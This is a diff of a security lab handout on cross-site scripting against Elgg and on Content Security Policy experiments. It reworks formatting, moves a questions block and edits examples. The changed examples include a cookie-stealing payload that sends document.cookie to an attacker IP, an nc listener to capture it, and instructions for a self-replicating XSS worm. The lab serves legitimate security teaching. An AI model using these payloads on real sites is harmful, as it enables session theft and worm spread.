@@ -124,14 +124,13 @@ Example:
 
 ```html
 <script>
-document.write('<img src="http://10.9.0.1:5555?c=' 
-+ escape(document.cookie) + '">');
+document.write('<img src="http://10.9.0.1:8090?cookie=' + escape(document.cookie) + '">');
 </script>
 ```
 
 Run a listener to capture the data:
 ```bash 
-nc -lknv 5555
+nc -lknv 8090
 ```
 
 Options:
@@ -215,16 +214,16 @@ window.onload = function() {
 
 Make your attack replicate itself. When a victim's profile is modified, your script should also copy itself into their profile.
 
-Two approaches (both are required):
+Two approaches (**both are required**):
 - Link-Based  method: Use a `<script src="...">` pointing to your hosted worm.
 - DOM method: Have the script read its own code and insert it into the victim's profile.
 
-Approach 1: Link-Based Example 
+**Approach 1:** Link-Based Example 
 ```html
 <script src="http://www.example.com/xss_worm.js"></script>
 ```
 
-Approach 2: DOM-Based Example
+**Approach 2:** DOM-Based Example
 
 ```html
 <script id="worm">
@@ -239,6 +238,14 @@ alert(jsCode);
 
 Note: `innerHTML` does not include the `<script>` tags, so they must be added manually.
 
+**Questions:**
+- Why must `<script>` tags be reconstructed manually?
+- What encoding issues arise?
+- Compare both propagation methods (Link-Based vs DOM-Based):
+  - stealth
+  - reliability
+  - detectability
+  - 
 ### Elgg Countermeasures (Reference Only)
 
 Elgg normally protects against XSS using:
@@ -261,10 +268,8 @@ XSS occurs because HTML allows code and data to mix. CSP (Content Security Polic
 
 #### Experiment Setup
 To experiment with CSP, we will set up several small websites. Inside the `Labsetup/image_www` Docker image folder, you'll find a file named `apache_csp.conf`. This configuration file defines five different websites. All of them share the same directory on disk, but each site uses different files from that directory.
-
-Two of the sites — `example60` and `example70` — are used to host JavaScript files that your CSP rules may allow or block.
-
-The other three sites — `example32a`, `example32b`, and `example32c` — are the main pages you will test. Each one has a different CSP configuration, allowing you to compare how various policies affect script execution.
+- Two of the sites — `example60` and `example70` — are used to host JavaScript files that your CSP rules may allow or block.
+- The other three sites — `example32a`, `example32b`, and `example32c` — are the main pages you will test. Each one has a different CSP configuration, allowing you to compare how various policies affect script execution.
 
 When working on this experiment, you will need to modify the Apache configuration file apache_csp.conf. You can update this file in two different ways:
 
@@ -276,7 +281,7 @@ If you change the configuration file directly inside the Docker image folder (be
 Only then will your changes take effect.
 
 **2. — Edit the file inside the running container**
-You can also modify the configuration file while the container is already running. The main limitation is that, to keep the image small, the container only includes a basic text editor: `nano`. It’s simple but perfectly fine for small edits. If you prefer another editor, you can add an installation command to the Dockerfile and rebuild the image.
+You can also modify the configuration file while the container is already running. The main limitation is that, to keep the image small, the container only includes a basic text editor: `nano`. It's simple but perfectly fine for small edits. If you prefer another editor, you can add an installation command to the Dockerfile and rebuild the image.
 
 Inside the running container, the configuration file is located at:
 
@@ -297,8 +302,8 @@ Apache can add HTTP headers to every response it serves, which makes it a conven
     ServerName www.example32b.com
     DirectoryIndex index.html
     Header set Content-Security-Policy " \
-            default-src ’self’; \
-            script-src ’self’ *.example70.com \
+            default-src 'self'; \
+            script-src 'self' *.example70.com \
         "
 </VirtualHost>
 ```
@@ -342,14 +347,6 @@ Answer the following:
 - Modify `example32b`  (modify the Apache configuration) so Areas 5 and 6 display OK.
 - Modify `example32c`  (modify the PHP code) so Areas 1, 2, 4, 5, and 6 display OK.
 - Explain why CSP helps prevent XSS attacks.
-
-**Questions:**
-- Why must <script> tags be reconstructed manually?
-- What encoding issues arise?
-- Compare both propagation methods:
-  - stealth
-  - reliability
-  - detectability
 
 ## Grading
 
